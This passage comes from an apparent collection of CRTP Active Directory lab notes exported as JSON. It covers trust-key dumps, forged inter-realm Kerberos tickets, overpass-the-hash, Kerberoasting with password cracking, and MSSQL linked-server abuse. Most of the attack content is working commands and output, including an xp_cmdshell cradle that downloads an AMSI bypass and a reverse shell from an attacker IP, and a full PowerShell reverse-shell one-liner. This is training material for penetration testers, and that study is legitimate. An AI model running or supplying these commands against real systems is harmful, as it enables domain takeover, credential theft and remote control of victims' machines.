8d50733d448ba0de52907c2149440864e0900630912df473c86b10210ea6f2f5\n        * aes128_hmac       76b8d7fd98adaeec643f33001fc600d9\n        * rc4_hmac_nt       72ff964e3822dad61c9f3c8369ae14e9\n\n [ Out ] EUROCORP.LOCAL -> DOLLARCORP.MONEYCORP.LOCAL\n    * 3/29/2024 2:01:41 PM - CLEAR   - ea 68 fd df 0d 24 9d 37 25 34 89 e6 06 fb dc 46 5b 75 eb 02 73 e4 71 4b e0 95 7f 7e d9 33 a9 8a 64 a5 f5 34 f8 3e dd a8 33 80 98 67 b4 16 89 7e 0a a9 8e 07 4c cb 12 18 62 df 22 97 46 c7 f4 be e1 de aa 5d dc 40 9e 99 81 ec 57 ab bc 95 e9 81 4a 27 d5 fe 06 db 72 4b 65 87 98 d4 2c b0 97 b4 3d 9d 6f 53 31 da 1b 3e 16 d5 08 58 0a ff c0 cb c6 a0 fc 5a 6e 68 56 ca 85 56 41 05 6c c8 7f 20 98 8e 51 2e 1b 57 9d 6a 5b c0 b8 db f2 4a c5 69 ab d6 4b b3 e2 42 23 e8 3a 14 9a b3 50 c0 bc 4c b9 42 2b d1 c5 b6 e0 68 6e 1c fd 73 b5 cd 9a 5f 9a 71 88 a0 fe 1c 6c dc ad 09 46 fb 45 4d 5d 34 1e 5c 2b b5 51 4e 45 2b ce fa 91 81 71 7d 54 66 5a be d6 9e 6e 62 8d e0 96 e4 e6 af cc 01 21 be 20 a8 6a 40 5e 33 85 7f d4 7f fc d7 72 e4 b6 83\n        * aes256_hmac       8ec86358852740120d6d7b5240d58a6769f296d436e24109503a4507d271afa2\n        * aes128_hmac       41430597506222b5f8130862b966672b\n        * rc4_hmac_nt       69bcbcbe734c17b9ed27bc8afb87b2c5\n\n [ In-1] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL\n    * 3/29/2024 2:03:54 PM - CLEAR   - a0 78 39 3e 63 28 91 11 d6 50 94 86 22 81 d8 68 d8 4f 76 d3 11 8b ce 16 d2 0e e8 6c 44 a2 f2 ed 1c 0d a6 49 0d 22 c2 67 e7 b9 56 1a 95 3e 6d bb 1b b1 f5 91 00 bd f5 da 13 e8 ea a1 f5 d7 1c 0c 1f 5d e4 77 1c 13 cc 8b 5d af 77 7e 18 b0 26 2e c8 67 12 29 c2 11 63 8d 6f 6d bd 9d 08 54 a9 f3 66 7f 95 cb 7b b3 ab cd 2e 14 08 f3 cd e6 ed 41 c5 3b 7d 02 cc 80 43 08 81 ad 6a a4 50 fa 68 2b fb 6d 45 9d 82 6f 1b 74 b6 1a 9e c7 36 1e fc 80 20 71 24 f5 02 5c d1 82 1a 2f fc fe 8d 31 f5 da 84 2a 7c 4b 4a 29 a9 d2 57 4a 7b 5b 64 3d 62 fb 98 3e cb 77 38 bb 14 d1 c2 40 6e 12 46 af c3 20 a9 69 ec 3f 50 fb 25 e2 f3 97 fb 5c 10 55 67 99 0c 9a 28 ef 4e ef c3 18 13 37 b9 38 2a 61 20 2c 4e ea 04 ab 5a 91 be fc f0 c9 42 3b b4 18 9e ab\n        * aes256_hmac       1390966ea936112a18459e9e6a6e4c5a4ae779545d63acaa80c890fc82dc3c52\n        * aes128_hmac       972ec2e32c180a481c0cf915b5725f8b\n        * rc4_hmac_nt       ca686d32aaefbef97b1f84aeaaf4c30d\n```\n\n```\nrc4:72ff964e3822dad61c9f3c8369ae14e9\n```\n## Using Rubeus\n\nLet's Forge a referral ticket. \n- Note that we are not injecting any SID History here as it would be filtered out. Run the below command:\n\n```\nC:\\AD\\Tools>echo %Pwn%\nsilver\n```\n\n```\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:72ff964e3822dad61c9f3c8369ae14e9 /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /nowrap\n```\n\nCopy the base64 encoded ticket from above and use it in the following command:\n\n```\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /service:HTTP/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket: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\n```\n\nor\n\n```\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /service:HTTP/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket: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\n```\nOnce the ticket is injected, we can access explicitly shared resources on eurocorp-dc.\n\n```\nnet show \\\\eurocorp-dc.eurocorp.local\\\n```\n```\ndir \\\\eurocorp-dc.eurocorp.local\\SharedwithDCorp\\\n```\n\n```\ntype \\\\eurocorp-dc.eurocorp.local\\SharedwithDCorp\\secret.txt\n```\n## Using BetterSafeKatz\nForge an inter-realm TGT. Run the below command from an elevated command prompt:\n\n```\nC:\\AD\\Tools\\BetterSafetyKatz.exe \"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /rc4:72ff964e3822dad61c9f3c8369ae14e9 /service:krbtgt /target:eurocorp.local /ticket:C:\\AD\\Tools\\trust_forest_tkt.kirbi\" \"exit\"\n```\n\n```\nC:\\AD\\Tools\\SafetyKatz.exe \"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /rc4:72ff964e3822dad61c9f3c8369ae14e9 /service:krbtgt /target:eurocorp.local /ticket:C:\\AD\\Tools\\trust_forest_tkt.kirbi\" \"exit\"\n```\n## Use the ticket with Rubeus:\n\n#### Create the inter-realm TGT:\n\n```\nC:\\Windows\\system32>echo %Pwn%\nasktgt\n```\n\n```\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /ticket:C:\\AD\\Tools\\trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt\n```\n\nCheck if we can access explicitly shared resources eurocorp-dc!\n\n```\ndir \\\\eurocorp-dc.eurocorp.local\\SharedwithDCorp\\\n```\n\n```\ntype \\\\eurocorp-dc.eurocorp.local\\SharedwithDCorp\\secret.txt\n```\n\n\n",
    "frontmatter": {}
  },
  {
    "slug": "02-CRTP/13-pass the hash",
    "path": "02-CRTP/13-pass the hash.md",
    "title": "13 Pass The Hash",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "OverPass-the-Hash ` C:\\AD\\Tools\\ArgSplit.bat ` ` asktgt ` ` C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca28350...",
    "category": "02-CRTP",
    "content": "\nOverPass-the-Hash\n\n```\nC:\\AD\\Tools\\ArgSplit.bat\n```\n\n```\nasktgt\n```\n\n```\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt\n```",
    "frontmatter": {}
  },
  {
    "slug": "02-CRTP/14-Kerberoast attack",
    "path": "02-CRTP/14-Kerberoast attack.md",
    "title": "14 Kerberoast Attack",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Solution We first need to find out services running with user accounts as the services running with machine accounts have difficult passwords. We can use PowerView's (Get-DomainUser -SPN) or ActiveDir...",
    "category": "02-CRTP",
    "content": "\n**Solution**\n\nWe first need to find out services running with user accounts as the services running with machine accounts have difficult passwords. We can use PowerView's (Get-DomainUser -SPN) or ActiveDirectory module for discovering such services:\n\n`C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat`\n\n```\n. C:\\AD\\Tools\\PowerView.ps1`\n```\n\n```\nGet-DomainUser -SPN\n```\n\n\n```\nC:\\AD\\Tools>**C:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat**\n[snip]\nPS C:\\AD\\Tools>**. C:\\AD\\Tools\\PowerView.ps1**\nPS C:\\AD\\Tools>**Get-DomainUser -SPN**\n[snip]\nlogoncount : 36\nbadpasswordtime : 11/25/2022 4:20:42 AM\ndescription : Account to be used for services which need high\nprivileges.\ndistinguishedname : CN=svc\nadmin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local\nobjectclass : {top, person, organizationalPerson, user}\ndisplayname : svc admin\nlastlogontimestamp : 3/3/2023 2:39:19 AM\nuserprincipalname : svcadmin\n**samaccountname : svcadmin**\nadmincount : 1\ncodepage : 0\nsamaccounttype : USER_OBJECT\naccountexpires : NEVER\ncountrycode : 0\nwhenchanged : 3/3/2023 10:39:19 AM\ninstancetype : 4\nusncreated : 40118\nobjectguid : 244f9c84-7e33-4ed6-aca1-3328d0802db0\nsn : admin\nlastlogoff : 12/31/1600 4:00:00 PM\nwhencreated : 11/14/2022 5:06:37 PM\nobjectcategory :\nCN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local\ndscorepropagationdata : {11/14/2022 5:15:01 PM, 11/14/2022 5:06:37 PM,\n1/1/1601 12:00:00 AM}\n**serviceprincipalname : {MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433,\nMSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local}**\ngivenname : svc\nusnchanged : 119163\nmemberof : CN=Domain\nAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local\nlastlogon : 3/3/2023 8:28:41 AM\nbadpwdcount : 0\ncn : svc admin\nuseraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD\nobjectsid : S-1-5-21-719815819-3726368948-3917688648-1118\nprimarygroupid : 513\npwdlastset : 11/14/2022 9:06:37 AM\nname : svc admin\n[snip]\n```\nNeat! The svcadmin, which is a domain administrator has a SPN set! Let's Kerberoast it!\n\n**Rubeus and John the Ripper**\n\nWe can use Rubeus to get hashes for the svcadmin account. Note that we are using the /rc4opsec option that gets hashes only for the accounts that support RC4. This means that if 'This account supports Kerberos AES 128/256 bit encryption' is set for a service account, the below command will not request its hashes.\n\n```\nArgSplit.bat\n```\n\n```\nC:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /user:svcadmin /simple /rc4opsec /outfile:C:\\AD\\Tools\\hashes.txt\n```\n\n```\nC:\\AD\\Tools>ArgSplit.bat\n[!] Argument Limit: 180 characters\n[+] Enter a string: kerberoast\nC:\\AD\\Tools>echo %Pwn%\nkerberoast\nC:\\AD\\Tools>C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /user:svcadmin /simple /rc4opsec /outfile:C:\\AD\\Tools\\hashes.txt\n\n ______ _\n (_____ \\ | |\n _____) )_ _| |__ _____ _ _ ___\n | __ /| | | | _ \\| ___ | | | |/___)\n | | \\ \\| |_| | |_) ) ____| |_| |___ |\n |_| |_|____/|____/|_____)____/(___/\n v2.2.1\n[*] Action: Kerberoasting\n[*] Using 'tgtdeleg' to request a TGT for the current user\n[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will\nbe requested for everything else\n[*] Target User : svcadmin\n[*] Target Domain : dollarcorp.moneycorp.local\n[+] Ticket successfully imported!\n**[*] Searching for accounts that only support RC4_HMAC, no AES**\n[*] Searching path 'LDAP://dcorpdc.dollarcorp.moneycorp.local/DC=dollarcorp,DC=moneycorp,DC=local' for\n'(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=svcadmin\n)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!msdssupportedencryptiontypes:1.2.840.113556.1.4.804:=24))'\n[*] Total kerberoastable users : 1\n[*] Hash written to C:\\AD\\Tools\\hashes.txt\n**[*] Roasted hashes written to : C:\\AD\\Tools\\hashes.txt**\n\n**We can now use John the Ripper to brute-force the hashes. Please note that you need to remove \":1433\" from the SPN in hashes.txt before running John**\n\n$krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorpmgmt.dollarcorp.moneycorp.local **:1433*** should be $krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorpmgmt.dollarcorp.moneycorp.local* in hashes.txt\n```\n\n\n\nRun the below command after making above changes\n\n```\nC:\\AD\\Tools\\john-1.9.0-jumbo-1-win64\\run\\john.exe --wordlist=C:\\AD\\Tools\\kerberoast\\10k-worst-pass.txt C:\\AD\\Tools\\hashes.txt\n```\n\n```\nC:\\AD\\Tools>**C:\\AD\\Tools\\john-1.9.0-jumbo-1-win64\\run\\john.exe --wordlist=C:\\AD\\Tools\\kerberoast\\10k-worst-pass.txt C:\\AD\\Tools\\hashes.txt**\nUsing default input encoding: UTF-8\nLoaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])\nWill run 3 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\n***ThisisBlasphemyThisisMadness!!** (?)\n1g 0:00:00:00 DONE (2023-03-03 09:18) 90.90g/s 186181p/s 186181c/s 186181C/s\nenergy..mollie\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n```",
    "frontmatter": {}
  },
  {
    "slug": "02-CRTP/20-PRINTER BUG",
    "path": "02-CRTP/20-PRINTER BUG.md",
    "title": "20 PRINTER BUG",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "unconstrained delegation",
    "category": "02-CRTP",
    "content": "## unconstrained delegation\n",
    "frontmatter": {}
  },
  {
    "slug": "02-CRTP/22-MSSQL ATTCKS",
    "path": "02-CRTP/22-MSSQL ATTCKS.md",
    "title": "22 MSSQL ATTCKS",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Enumerating SQL servers in the domain and if student222 has privileges to connect to any of them. We can use PowerUpSQL module for that. Run the below command from a PowerShell session started using I...",
    "category": "02-CRTP",
    "content": "\n\nEnumerating SQL servers in the domain and if student222 has privileges to connect to any of them. We can use PowerUpSQL module for that. Run the below command from a PowerShell session started using Invisi-Shell:\n\n\n```\nC:\\AD\\Tools\\InviShell\\RunWithRegistryNonAdmin.bat\n```\n\n```\nImport-Module C:\\AD\\Tools\\PowerUpSQL-master\\PowerupSQL.psd1\n```\n\n```\nGet-SQLInstanceDomain | Get-SQLServerinfo -Verbose\n```\n\n![](https://i.imgur.com/VBobSJY.png)\n\n\nSo, we can connect to dcorp-mssql. Using HeidiSQL client, let's login to dcorp-mssql using windows authentication of student222. After login, enumerate linked databases on dcorp-mssql:\n\n![](https://i.imgur.com/KUIcSjv.png)\n\n\n```\nselect * from master..sysservers\n```\n\nSo, there is a database link to dcorp-sql1 from dcorp-mssql. Let's enumerate further links from dcorpsql1. This can be done with the help of openquery:\n\n```\nselect * from openquery(\"DCORP-SQL1\",'select * from master..sysservers')\n```\n\n\n![](https://i.imgur.com/Z78eAsE.png)\n\n\nIt is possible to nest openquery within another openquery which leads us to dcorp-mgmt:\n\n```\nselect * from openquery(\"DCORP-SQL1\",'select * from openquery(\"DCORP-MGMT\",''select * from master..sysservers'')')\n```\n\n![](https://i.imgur.com/35tW1M9.png)\n\nWe can also use Get-SQLServerLinkCrawl for crawling the database links automatically:\n\n```\nGet-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose\n```\n\n\n![](https://i.imgur.com/XkEGflk.jpeg)\n\n\nIf xp_cmdshell is enabled (or RPC out is true - which is set to false in this case), it is possible to execute commands on eu-sql using linked databases. To avoid dealing with a large number of quotes and escapes, we can use the following command:\n\n```\nGet-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query \"exec master..xp_cmdshell 'set username'\"\n```\n\n![](https://i.imgur.com/PrnX8Sy.png)\n\nexecute a PowerShell download execute cradle to execute a PowerShell reverse shell on the eu-sql instance. Remember to start a listener:\n\n```\nGet-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''powershell -c \"iex (iwr -UseBasicParsing http://172.16.100.222/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.222/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.100.222/Invoke-PowerShellTcpEx.ps1)\"''' -QueryTarget eu-sql20  \n```\n\n![](https://i.imgur.com/sMeOUSM.png)\n\n\nRunning listener \n\n```\nC:\\AD\\Tools\\netcat-win32-1.12\\nc64.exe -lvp 443  \n```\n\n\n![](https://i.imgur.com/Q3GQBLH.jpeg)\n",
    "frontmatter": {}
  },
  {
    "slug": "02-CRTP/other tools",
    "path": "02-CRTP/other tools.md",
    "title": "Other Tools",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "- certificate abuse tool in active directory Certify - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin - ht...",
    "category": "02-CRTP",
    "content": "\n\n- certificate abuse tool in active directory [Certify](https://github.com/GhostPack/Certify)\n- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin\n- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation\n\n```\nC:\\Tools>Certify.exe\n\n   _____          _   _  __\n  / ____|        | | (_)/ _|\n | |     ___ _ __| |_ _| |_ _   _\n | |    / _ \\ '__| __| |  _| | | |\n | |___|  __/ |  | |_| | | | |_| |\n  \\_____\\___|_|   \\__|_|_|  \\__, |\n                             __/ |\n                            |___./\n  v1.0.0\n\n\n  Find information about all registered CAs:\n\n    Certify.exe cas [/ca:SERVER\\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks] [/quiet]\n\n\n  Find all enabled certificate templates:\n\n    Certify.exe find [/ca:SERVER\\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]\n\n  Find vulnerable/abusable certificate templates using default low-privileged groups:\n\n    Certify.exe find /vulnerable [/ca:SERVER\\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]\n\n  Find vulnerable/abusable certificate templates using all groups the current user context is a part of:\n\n    Certify.exe find /vulnerable /currentuser [/ca:SERVER\\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]\n\n  Find enabled certificate templates where ENROLLEE_SUPPLIES_SUBJECT is enabled:\n\n    Certify.exe find /enrolleeSuppliesSubject [/ca:SERVER\\ca-name| /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]\n\n  Find enabled certificate templates capable of client authentication:\n\n    Certify.exe find /clientauth [/ca:SERVER\\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/quiet]\n\n  Find all enabled certificate templates, display all of their permissions, and don't display the banner message:\n\n    Certify.exe find /showAllPermissions /quiet [/ca:COMPUTER\\CA_NAME | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local]\n\n  Find all enabled certificate templates and output to a json file:\n\n    Certify.exe find /json /outfile:C:\\Temp\\out.json [/ca:COMPUTER\\CA_NAME | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local]\n\n\n  Enumerate access control information for PKI objects:\n\n    Certify.exe pkiobjects [/domain:domain.local] [/showAdmins] [/quiet]\n\n\n  Request a new certificate using the current user context:\n\n    Certify.exe request /ca:SERVER\\ca-name [/subject:X] [/template:Y] [/install]\n\n  Request a new certificate using the current machine context:\n\n    Certify.exe request /ca:SERVER\\ca-name /machine [/subject:X] [/template:Y] [/install]\n\n  Request a new certificate using the current user context but for an alternate name (if supported):\n\n    Certify.exe request /ca:SERVER\\ca-name /template:Y /altname:USER\n\n  Request a new certificate on behalf of another user, using an enrollment agent certificate:\n\n    Certify.exe request /ca:SERVER\\ca-name /template:Y /onbehalfof:DOMAIN\\USER /enrollcert:C:\\Temp\\enroll.pfx [/enrollcertpw:CERT_PASSWORD]\n\n\n  Download an already requested certificate:\n\n    Certify.exe download /ca:SERVER\\ca-name /id:X [/install] [/machine]\n\n\n\nCertify completed in 00:00:00.0200190\n```\n\n\n#### Client (target)\n\n## PowerShell One-liner\n\n\n```cmd-session\npowershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.235',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n```\n\nNote: If we are using Pwnbox, keep in mind that some browsers do not work as seamlessly when using the Clipboard feature to paste a command directly into the CLI of a target. In these cases, we may want to paste into Notepad on the target, then copy & paste from inside the target.\n\nPlease take a close look at the command and consider what we need to change for this to allow us to establish a reverse shell with our attack box. This PowerShell code can also be called `shell code` or our `payload`. Delivering this payload onto the Windows system was pretty straightforward, considering we have complete control of the target for demonstration purposes. As this module progresses, we will notice the difficulty increases in how we deliver the payload onto targets.\n\n`What happened when we hit enter in command prompt?`\n\n\n```cmd-session\nAt line:1 char:1\n+ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\nThis script contains malicious content and has been blocked by your antivirus software.\n    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException\n    + FullyQualifiedErrorId : ScriptContainedMaliciousContent\n```\n\nThe `Windows Defender antivirus` (`AV`) software stopped the execution of the code. This is working exactly as intended, and from a `defensive` perspective, this is a `win`. From an offensive standpoint, 